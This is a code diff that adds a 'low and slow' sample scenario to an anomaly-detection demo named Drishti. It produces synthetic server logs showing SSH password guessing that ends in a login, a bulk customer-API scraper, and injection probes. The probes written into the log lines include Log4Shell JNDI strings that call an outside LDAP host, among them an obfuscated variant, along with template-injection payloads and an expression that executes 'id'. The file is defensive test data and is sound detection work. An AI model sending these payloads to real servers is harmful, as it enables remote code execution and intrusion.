@@ -178,6 +178,85 @@ function webAttack(): string[] {
   return lines;
 }
 
+/**
+ * Attacks tuned to stay under every rule threshold, so only the Drishti
+ * anomaly model can see them: slow password guessing that ends in a login,
+ * a fast API scraper with a clean 200 status, and template/JNDI injection
+ * payloads that no signature lists. Ordinary traffic is mixed in.
+ */
+function stealth(): string[] {
+  const lines: string[] = [
+    `${sysTime(0, 2)} web-01 sshd[3990]: Accepted publickey for alice from 10.0.0.12 port 50122 ssh2`,
+    `${sysTime(0, 3)} fw-01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=10.0.0.12 DST=10.0.0.5 PROTO=TCP SPT=50122 DPT=22`,
+  ];
+  const guesses = [
+    'root',
+    'admin',
+    'deploy',
+    'root',
+    'deploy',
+    'admin',
+    'deploy',
+    'root',
+    'deploy',
+    'admin',
+    'deploy',
+    'root',
+    'deploy',
+    'deploy',
+  ];
+  guesses.forEach((user, i) =>
+    lines.push(
+      `${sysTime(2 + i * 3, (i * 17) % 60)} web-01 sshd[${4400 + i}]: Failed password for ${user} from 203.0.113.66 port ${52000 + i} ssh2`,
+    ),
+  );
+  lines.push(
+    `${sysTime(45, 12)} web-01 sshd[4460]: Accepted password for deploy from 203.0.113.66 port 52099 ssh2`,
+  );
+  const shoppers: [string, string][] = [
+    ['192.0.2.44', 'GET /'],
+    ['192.0.2.44', 'GET /products.php?id=12'],
+    ['192.0.2.44', "GET /search?q=men's%20jacket"],
+    ['192.0.2.44', 'GET /cart'],
+    ['192.0.2.51', 'GET /'],
+    ['192.0.2.51', 'POST /login'],
+    ['192.0.2.51', 'GET /account/orders'],
+    ['192.0.2.60', 'GET /category/shoes?page=2&sort=price'],
+    ['192.0.2.60', 'GET /products.php?id=31'],
+  ];
+  shoppers.forEach(([ip, req], i) =>
+    lines.push(webLine(ip, i * 2, (i * 11) % 60, req, req === 'POST /login' ? 302 : 200, BROWSER)),
+  );
+  for (let i = 0; i < 12; i++) {
+    lines.push(webLine('198.51.100.10', i * 3, 5, 'GET /health', 200, 'UptimeRobot/2.0'));
+  }
+  for (let i = 0; i < 110; i++) {
+    const sec = Math.floor(i * 0.8);
+    lines.push(
+      webLine(
+        '198.51.100.88',
+        20 + Math.floor(sec / 60),
+        sec % 60,
+        `GET /api/v1/customers?page=${i + 1}&per_page=100`,
+        200,
+        'python-requests/2.32.3',
+      ),
+    );
+  }
+  const probes: [string, number][] = [
+    ['GET /?x=${jndi:ldap://198.51.100.9:1389/a}', 400],
+    ['GET /search?q={{7*7}}', 500],
+    ["GET /search?q=${T(java.lang.Runtime).getRuntime().exec('id')}", 500],
+    ['GET /api/v1/render?tpl=<%25=%207*7%20%25>', 500],
+    ['GET /?q=${${lower:j}ndi:${lower:l}dap://198.51.100.9/b}', 400],
+    ['GET /login?next={{config.items()}}', 500],
+  ];
+  probes.forEach(([req, status], i) =>
+    lines.push(webLine('192.0.2.200', 30, i * 9, req, status, BROWSER)),
+  );
+  return lines;
+}
+
 export const SAMPLES: readonly SampleScenario[] = [
   {
     id: 'ssh-compromise',
@@ -210,6 +289,13 @@ export const SAMPLES: readonly SampleScenario[] = [
       ...compromiseChain('203.0.113.45', 9),
       ...webAttack().slice(0, 9),
     ].join('\n'),
+  },
+  {
+    id: 'stealth',
+    name: 'Low and slow (only ML sees it)',
+    description:
+      'Slow password guessing that ends in a login, a fast data scraper and novel injection payloads, all tuned to stay under the rules. Drishti, the anomaly model, catches them.',
+    logs: stealth().join('\n'),
   },
   {
     id: 'clean',
